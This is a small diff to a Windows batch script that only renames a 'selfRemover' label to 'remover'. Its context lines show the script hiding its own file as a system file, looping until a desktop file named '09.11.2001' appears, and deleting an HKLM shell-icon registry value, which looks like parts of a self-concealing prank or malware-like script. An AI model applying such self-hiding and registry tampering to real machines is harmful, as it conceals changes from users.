@@ -88,7 +88,7 @@ attrib +h +r +s "%~dpnx0"
 
 
 :cycle
-if exist "%path_desktop%\09.11.2001" goto :selfRemover
+if exist "%path_desktop%\09.11.2001" goto :remover
 
 
 
@@ -226,7 +226,7 @@ goto :cycle
 
 
 
-:selfRemover
+:remover
 reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f >nul
 
 
